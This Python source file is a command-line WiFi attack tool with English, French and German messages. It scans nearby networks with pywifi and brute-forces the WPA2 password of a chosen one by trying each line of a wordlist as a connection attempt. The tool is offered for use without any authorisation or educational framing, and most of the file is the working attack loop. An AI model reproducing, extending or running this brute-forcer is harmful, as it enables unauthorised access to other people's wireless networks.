import pywifi
from pywifi import const, Profile
import time
import os
import threading
import sys

# Dictionnaire pour les messages dans différentes langues
messages = {
    "en": {
        "scan_results": "Detected WiFi Networks:",
        "attack_start": "Launching attack on {} with {} passwords...",
        "success": "[SUCCESS] Password found: {}",
        "no_password": "No valid password found.",
        "invalid_number": "Invalid number.",
        "specify_number": "Specify a valid network number.",
        "scan_first": "Please scan networks with 'scan' first.",
        "help_message": "Available commands:\n- scan: Scan available WiFi networks.\n- attack [number]: Launch attack on specified WiFi network.\n- info [number]: Show information about specified WiFi network.\n- list: List all detected WiFi networks with additional details.\n- clear: Clear the console screen for better readability.\n- help: Show this help.\n- exit: Close the program.\n- lang [en/fr/de]: Change language.",
        "network_info": "Information about network {}:",
        "ssid": "SSID: {}",
        "signal": "Signal: {} dBm",
        "bssid": "BSSID: {}",
        "security_type": "Security Type: {}",
        "exiting": "Closing the program...",
        "unknown_command": "Unknown command.",
        "unexpected_error": "Unexpected error: {}",
        "wordlist_not_found": "Wordlist file not found!",
        "connection_error": "Error during connection attempt: {}",
        "scan_error": "Error during WiFi scan: {}",
        "info_error": "Error displaying information: {}",
        "progress": "Progress: {:.2f}%",
        "network_list": "Detailed list of detected WiFi networks:",
    },
    "fr": {
        "scan_results": "Réseaux WiFi détectés :",
        "attack_start": "Lancement de l'attaque sur {} avec {} mots de passe...",
        "success": "[SUCCÈS] Mot de passe trouvé : {}",
        "no_password": "Aucun mot de passe valide trouvé.",
        "invalid_number": "Numéro invalide.",
        "specify_number": "Spécifiez un numéro de réseau valide.",
        "scan_first": "Veuillez d'abord scanner les réseaux avec 'scan'.",
        "help_message": "Commandes disponibles :\n- scan : Scanne les réseaux WiFi disponibles.\n- attack [numéro] : Lance une attaque sur le réseau WiFi spécifié.\n- info [numéro] : Affiche des informations sur le réseau WiFi spécifié.\n- list : Lister tous les réseaux WiFi détectés avec des détails supplémentaires.\n- clear : Effacer l'écran de la console pour une meilleure lisibilité.\n- help : Affiche cette aide.\n- exit : Ferme le programme.\n- lang [en/fr/de] : Changer de langue.",
        "network_info": "Informations sur le réseau {} :",
        "ssid": "SSID : {}",
        "signal": "Signal : {} dBm",
        "bssid": "BSSID : {}",
        "security_type": "Type de sécurité : {}",
        "exiting": "Fermeture du programme...",
        "unknown_command": "Commande inconnue.",
        "unexpected_error": "Erreur inattendue : {}",
        "wordlist_not_found": "Fichier wordlist introuvable !",
        "connection_error": "Erreur lors de la tentative de connexion : {}",
        "scan_error": "Erreur lors du scan WiFi : {}",
        "info_error": "Erreur lors de l'affichage des informations : {}",
        "progress": "Progression : {:.2f}%",
        "network_list": "Liste détaillée des réseaux WiFi détectés :",
    },
    "de": {
        "scan_results": "Erkannte WLAN-Netzwerke:",
        "attack_start": "Angriff auf {} mit {} Passwörtern wird gestartet...",
        "success": "[ERFOLG] Passwort gefunden: {}",
        "no_password": "Kein gültiges Passwort gefunden.",
        "invalid_number": "Ungültige Nummer.",
        "specify_number": "Geben Sie eine gültige Netzwerknummer an.",
        "scan_first": "Bitte zuerst Netzwerke mit 'scan' scannen.",
        "help_message": "Verfügbare Befehle:\n- scan: Scannt verfügbare WLAN-Netzwerke.\n- attack [Nummer]: Startet Angriff auf das angegebene WLAN-Netzwerk.\n- info [Nummer]: Zeigt Informationen über das angegebene WLAN-Netzwerk.\n- list: Listet alle erkannten WLAN-Netzwerke mit zusätzlichen Details auf.\n- clear: Löscht den Konsolenbildschirm für bessere Lesbarkeit.\n- help: Zeigt diese Hilfe.\n- exit: Schließt das Programm.\n- lang [en/fr/de]: Sprache ändern.",
        "network_info": "Informationen über das Netzwerk {}:",
        "ssid": "SSID: {}",
        "signal": "Signal: {} dBm",
        "bssid": "BSSID: {}",
        "security_type": "Sicherheitstyp: {}",
        "exiting": "Programm wird geschlossen...",
        "unknown_command": "Unbekannter Befehl.",
        "unexpected_error": "Unvorhergesehener Fehler: {}",
        "wordlist_not_found": "Wordlist-Datei nicht gefunden!",
        "connection_error": "Fehler beim Verbindungsversuch: {}",
        "scan_error": "Fehler beim WLAN-Scan: {}",
        "info_error": "Fehler beim Anzeigen der Informationen: {}",
        "progress": "Fortschritt: {:.2f}%",
        "network_list": "Detaillierte Liste der erkannten WLAN-Netzwerke:",
    }
}

current_language = "en"

def get_message(key):
    return messages[current_language].get(key, f"Message '{key}' not found.")

def scan_wifi():
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(2)
        scan_results = iface.scan_results()

        networks = []
        print(f"\n{get_message('scan_results')}")
        for index, network in enumerate(scan_results):
            print(f"\033[33m[{index}] {network.ssid} - Signal: {network.signal} dBm\033[0m")
            networks.append(network)

        return networks
    except Exception as e:
        print(f"\033[31m{get_message('scan_error')} {e}\033[0m")
        return []

def try_password(iface, target_ssid, password, success_event, progress_event):
    if success_event.is_set():
        return

    try:
        profile = Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(0.5)

        if iface.status() == const.IFACE_CONNECTED:
            print(f"\n\033[32m{get_message('success').format(password)}\033[0m")
            iface.disconnect()
            success_event.set()
            progress_event.set()
    except Exception as e:
        print(f"\033[31m{get_message('connection_error')} {e}\033[0m")

def attack_wifi(target_ssid, wordlist):
    try:
        if not os.path.exists(wordlist):
            print(f"\033[31m{get_message('wordlist_not_found')}\033[0m")
            return

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        with open(wordlist, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"\n\033[36m{get_message('attack_start').format(target_ssid, len(passwords))}\033[0m")

        success_event = threading.Event()
        progress_event = threading.Event()
        threads = []

        for index, password in enumerate(passwords):
            if success_event.is_set():
                break

            print(f"\033[33m[Tentative {index + 1}/{len(passwords)}] Mot de passe : {password}\033[0m")
            thread = threading.Thread(target=try_password, args=(iface, target_ssid, password, success_event, progress_event))
            threads.append(thread)
            thread.start()

            if len(threads) >= 10:
                for t in threads:
                    t.join()
                threads = []

            # Update progress
            progress = (index + 1) / len(passwords) * 100
            sys.stdout.write(f"\r{get_message('progress').format(progress)}")
            sys.stdout.flush()

        for t in threads:
            t.join()

        if not success_event.is_set():
            print(f"\n\033[31m{get_message('no_password')}\033[0m")
    except Exception as e:
        print(f"\033[31m{get_message('unexpected_error')} {e}\033[0m")

def show_help():
    print(f"\n\033[36m{get_message('help_message')}\033[0m")

def show_network_info(networks, num):
    try:
        if num < 0 or num >= len(networks):
            print(f"\033[31m{get_message('invalid_number')}\033[0m")
            return

        network = networks[num]
        print(f"\n\033[36m{get_message('network_info').format(network.ssid)}\033[0m")
        print(f"\033[33m{get_message('ssid').format(network.ssid)}\033[0m")
        print(f"\033[33m{get_message('signal').format(network.signal)}\033[0m")
        print(f"\033[33m{get_message('bssid').format(network.bssid)}\033[0m")
        print(f"\033[33m{get_message('security_type').format(network.akm[0] if network.akm else 'Aucune')}\033[0m")
    except Exception as e:
        print(f"\033[31m{get_message('info_error')} {e}\033[0m")

def list_networks(networks):
    if not networks:
        print(f"\033[31m{get_message('scan_first')}\033[0m")
        return

    print(f"\n\033[36m{get_message('network_list')}\033[0m")
    for index, network in enumerate(networks):
        print(f"\033[33m[{index}] {get_message('ssid').format(network.ssid)}")
        print(f"{get_message('signal').format(network.signal)}")
        print(f"{get_message('bssid').format(network.bssid)}")
        print(f"{get_message('security_type').format(network.akm[0] if network.akm else 'Aucune')}\033[0m")

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    global current_language
    networks = []
    while True:
        try:
            cmd = input(f"\n\033[36m{get_message('help_message')} : \033[0m").strip().lower()

            if cmd == "scan":
                networks = scan_wifi()

            elif cmd.startswith("attack"):
                if not networks:
                    print(f"\033[31m{get_message('scan_first')}\033[0m")
                    continue

                parts = cmd.split()
                if len(parts) < 2 or not parts[1].isdigit():
                    print(f"\033[31m{get_message('specify_number')}\033[0m")
                    continue

                num = int(parts[1])
                if num < 0 or num >= len(networks):
                    print(f"\033[31m{get_message('invalid_number')}\033[0m")
                    continue

                attack_wifi(networks[num].ssid, "wordlist.txt")

            elif cmd.startswith("info"):
                if not networks:
                    print(f"\033[31m{get_message('scan_first')}\033[0m")
                    continue

                parts = cmd.split()
                if len(parts) < 2 or not parts[1].isdigit():
                    print(f"\033[31m{get_message('specify_number')}\033[0m")
                    continue

                num = int(parts[1])
                show_network_info(networks, num)

            elif cmd == "list":
                list_networks(networks)

            elif cmd == "clear":
                clear_console()

            elif cmd == "help":
                show_help()

            elif cmd.startswith("lang"):
                parts = cmd.split()
                if len(parts) < 2 or parts[1] not in messages:
                    print(f"\033[31m{get_message('unknown_command')}\033[0m")
                    continue
                current_language = parts[1]
                print(f"\033[36mLanguage set to {current_language}.\033[0m")

            elif cmd == "exit":
                print(f"\033[36m{get_message('exiting')}\033[0m")
                break
            else:
                print(f"\033[31m{get_message('unknown_command')}\033[0m")
        except Exception as e:
            print(f"\033[31m{get_message('unexpected_error')} {e}\033[0m")

if __name__ == "__main__":
    main()
